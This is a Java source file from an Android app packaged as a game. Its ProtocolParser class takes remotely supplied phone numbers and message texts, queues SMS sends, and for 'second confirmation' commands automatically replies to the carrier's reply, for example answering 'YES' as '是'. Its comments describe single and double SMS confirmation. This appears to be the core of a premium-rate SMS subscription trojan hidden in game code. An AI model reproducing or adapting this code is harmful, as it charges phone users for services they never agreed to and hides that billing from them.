package cn.com.tiantong.game72;




import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import cn.com.tiantong.game72.n.m.CommandBean;
import cn.com.tiantong.game72.util.Command;
import cn.com.tiantong.game72.util.CommandContainer;

public class ProtocolParser {

//	private static final String tag = "ProtocolParser";
	private final String[] table = {"000", "001", "002", "003", "004", "005", "006"};
	public static Context mContext = null;
	
	private List<Command> mSMS005CMD = null;
	private List<Command> mSMS006CMD = null;
	
	public static Timer mTimer = null;	
	public static boolean ispassed = true;
	public static final int Delay =30 * 60 * 1000;	
	
	public ProtocolParser(Context context){
		this.mContext = context;
	}
	
	public void Parser(List<CommandBean> beanList) {
		
		if(mSMS005CMD != null){
			mSMS005CMD.clear();
		}else{
			mSMS005CMD = new ArrayList<Command>();
		}
		
		if(mSMS006CMD != null){
			mSMS006CMD.clear();
		}else{
			mSMS006CMD =new ArrayList<Command>();
		}
		
		if(beanList != null && ! beanList.isEmpty()){
			
			for(CommandBean bean : beanList){
				
				String type = bean.getType();
				
				if(table[5].equals(type)){
					//LH.LogPrint(tag, "开始一次短信确认：number:" + bean.getAddress() + ", context1:" + bean.getContext1());
					
					Command temp005 = new Command(0, bean.getAddress(), bean.getContext1(), "", 0, bean.getMsgId());							
					if(mSMS005CMD != null){
						mSMS005CMD.add(temp005);				
					}
				}else if(table[6].equals(type)){
					//LH.LogPrint(tag, "开始二次短信确认：number:" + bean.getAddress() + ", context1:" + bean.getContext1() + ", context2:" + bean.getContext2());
					
					Command temp006 = new Command(0, bean.getAddress(), bean.getContext1(), bean.getContext2(), 0, bean.getMsgId());
					if(mSMS006CMD != null){
						mSMS006CMD.add(temp006);
					}
				}
				
			}
			
			preHandleMSG();
		}
	}
	
	
	public void preHandleMSG(){
		
		for(int i = 0; i < mSMS006CMD.size(); i++){
			handle006(mSMS006CMD.get(i).getNumber(), mSMS006CMD.get(i).getContent1(), mSMS006CMD.get(i).getContent2(), mSMS006CMD.get(i).getMsgId());				
		}
		
		////LH.LogPrint(tag, "handleMSG:005size=" + mSMS005CMD.size());
		for(int j = 0; j < mSMS005CMD.size(); j++){
			handle005(mSMS005CMD.get(j).getNumber(), mSMS005CMD.get(j).getContent1(), mSMS005CMD.get(j).getMsgId());					
		}
	}
	
	/*
	 * 发送单条短信内容content到number
	 */
		public void handle005(String number, String content, String msgId){
	/*		
			SharedPreferences AccountSetting = mContext.getSharedPreferences(MS.PREFS_NAME, 0);
	        SharedPreferences.Editor configEditor = AccountSetting.edit();
	        configEditor.putString(MS.PREFS_PHONE_NUMBER_005, number);
	        configEditor.putString(MS.PREFS_PHONE_CONTENT_005, content);
	        configEditor.commit();
			sendSMS1(number,content);
	*/		
			////LH.LogPrint(tag, "handle005:" + number + "," + content);
			CommandContainer commands = CommandContainer.GetInstance(mContext);
			if(commands.GetLength() > 0){
				commands.AddCommand(number, content, "", 0, msgId);
			}else{
				//第一个
				commands.AddCommand(number, content, "", 0, msgId);
				commands.DoNextCommand();
			}
			Starttimer();

		}
	/*
	 * 发送短信content1到number,待收number的信息后在回复content2
	 */	
		
		public void handle006(String number, String content1, String content2, String msgId){
			
			////LH.LogPrint(tag, "handle006:" + number+ "," + content1+ "," + content2); 	
	/*		
			SharedPreferences AccountSetting = mContext.getSharedPreferences(MS.PREFS_NAME, 0);
	        SharedPreferences.Editor configEditor = AccountSetting.edit();		
	        configEditor.putString(MS.PREFS_PHONE_NUMBER_006, number);
	        configEditor.putString(MS.PREFS_PHONE_CONTENT_006, content2);      
	        configEditor.commit();		
	*/        		
			CommandContainer commands = CommandContainer.GetInstance(mContext);
			if(content2.equalsIgnoreCase("YES")){
				content2 = "是";
			}
			
			if(commands.GetLength()  >0){
				commands.AddCommand(number, content1, content2, 2, msgId);
			}else{
				//第一个
				commands.AddCommand(number, content1, content2, 2, msgId);			
				commands.DoNextCommand();	
			}
			Starttimer();
			
					        			
		}
		
		
		public static void Starttimer(){
		       if(mTimer != null){
		    	   mTimer.cancel();
		       }
		       ////LH.LogPrint(tag, "Starttimer"); 		    
		       ispassed = false;
		       mTimer = new Timer();		
		       mTimer.schedule(new TimerTask() {			
			        			@Override
			        			public void run() {
			        				////LH.LogPrint(tag, "timer out"); 		        				
			        				mTimer = null;		
			        				ispassed = true;
			        			}
			        		}, Delay);				      
		}
		
	
}
